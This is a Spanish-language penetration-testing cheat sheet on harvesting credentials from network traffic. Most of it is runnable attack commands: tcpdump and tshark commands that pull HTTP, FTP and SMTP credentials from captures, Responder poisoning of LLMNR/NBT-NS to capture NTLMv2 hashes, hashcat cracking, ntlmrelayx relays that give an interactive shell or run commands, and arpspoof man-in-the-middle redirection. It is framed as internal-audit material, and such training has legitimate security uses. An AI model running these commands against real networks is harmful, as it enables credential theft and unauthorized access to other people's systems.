# Búsqueda de Credenciales en Tráfico de Red

La captura pasiva de tráfico permite interceptar credenciales transmitidas en claro o en formatos débiles sin interactuar directamente con los sistemas objetivo. En redes internas donde los protocolos legacy siguen activos, esta técnica es silenciosa y efectiva.

### Protocolos que transmiten credenciales en claro

| Protocolo         | Puerto      | Credenciales expuestas                 |
| ----------------- | ----------- | -------------------------------------- |
| FTP               | TCP 21      | Usuario y contraseña en texto claro    |
| Telnet            | TCP 23      | Todo el canal, incluyendo credenciales |
| HTTP Basic/Digest | TCP 80      | Base64 (Basic) o hash MD5 (Digest)     |
| SMTP              | TCP 25/587  | AUTH PLAIN / AUTH LOGIN en Base64      |
| IMAP/POP3         | TCP 143/110 | Credenciales en claro si no hay TLS    |
| SNMP v1/v2c       | UDP 161     | Community strings en claro             |
| LDAP              | TCP 389     | Simple bind con contraseña en claro    |
| HTTP form POST    | TCP 80      | Campos de formulario de login          |

### Captura pasiva con tcpdump

```bash
# Capturar todo el tráfico en la interfaz de red
sudo tcpdump -i eth0 -w captura.pcap

# Filtrar solo tráfico HTTP
sudo tcpdump -i eth0 port 80 -A

# Filtrar FTP
sudo tcpdump -i eth0 port 21 -A

# Captura en modo promiscuo (requiere acceso a switch/hub o port mirroring)
sudo tcpdump -i eth0 -p -w captura.pcap
```

### Análisis con Wireshark

Para extraer credenciales de un `.pcap` capturado:

* HTTP: `Edit → Find Packet → String → "Authorization"` o filtro `http.authbasic`
* FTP: filtro `ftp` → buscar paquetes `USER` y `PASS`
* SMTP: filtro `smtp` → buscar `AUTH`
* SNMP: filtro `snmp` → community strings visibles en el campo `community`

Desde línea de comandos con `tshark`:

```bash
# Extraer credenciales HTTP Basic
tshark -r captura.pcap -Y "http.authbasic" -T fields -e http.authbasic

# Extraer comandos FTP
tshark -r captura.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# Extraer SMTP AUTH
tshark -r captura.pcap -Y "smtp.auth" -T fields -e smtp.auth.username -e smtp.auth.password
```

### Captura activa de hashes NTLM con Responder

Responder es la herramienta estándar para capturar hashes NTLMv2 en redes Windows mediante envenenamiento de protocolos de resolución de nombres: LLMNR, NBT-NS y mDNS.

Cuando un host intenta resolver un nombre que no existe en DNS, difunde la solicitud por LLMNR/NBT-NS. Responder responde haciéndose pasar por el host buscado, lo que fuerza al cliente a autenticarse y revela su hash NTLMv2.

```bash
# Modo escucha y envenenamiento en la interfaz de red
sudo responder -I eth0 -wrdv

# Solo escucha pasiva (sin envenenamiento — menos ruidoso)
sudo responder -I eth0 -A
```

Los hashes capturados se guardan en `/usr/share/responder/logs/`:

```
[SMB] NTLMv2-SSP Hash     : jsmith::EMPRESA:abc123...:hash_completo
```

Cracking del hash capturado:

```bash
hashcat -m 5600 responder_hashes.txt rockyou.txt -r best64.rule
```

> Responder con envenenamiento activo es muy ruidoso en redes modernas con monitorización. En entornos con Microsoft Defender for Identity o NDR, los eventos de envenenamiento LLMNR se alertan casi inmediatamente. Evaluar el riesgo de detección antes de activarlo.

### Relay de hashes NTLM — ntlmrelayx

En lugar de crackear el hash, se puede retransmitirlo directamente a otro host para autenticarse sin conocer la contraseña. Requiere que SMB signing esté desactivado en el objetivo.

```bash
# Verificar si SMB signing está desactivado en la red
netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Lanzar relay (en otra terminal, Responder en modo sin SMB/HTTP para ceder el puerto)
sudo responder -I eth0 -wrd --disable-ess
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay con shell interactiva
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

# Relay ejecutando comando
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"
```

> &#x20;NTLMRelay es uno de los ataques más impactantes en redes Windows corporativas con SMB signing desactivado. Un solo hash de admin local o de dominio puede dar acceso inmediato a múltiples sistemas sin necesidad de cracking.

### Captura en redes conmutadas

En redes con switches (la mayoría de redes modernas), la captura pasiva solo recibe el tráfico destinado al propio host o broadcast. Para capturar tráfico de otros hosts se necesita:

* **ARP Spoofing / MITM**: redirigir el tráfico a través del host atacante
* **Port mirroring (SPAN)**: configurado en el switch, requiere acceso administrativo al switch
* **Hub legacy o TAP físico**: todo el tráfico es visible

```bash
# ARP spoofing con arpspoof (dsniff)
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # envenenar víctima
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10   # envenenar gateway

# Habilitar IP forwarding para no cortar el tráfico
echo 1 > /proc/sys/net/ipv4/ip_forward
```

> En auditorías internas, la combinación Responder + NTLMRelay suele ser más rápida y silenciosa que ARP spoofing para capturar credenciales Windows.
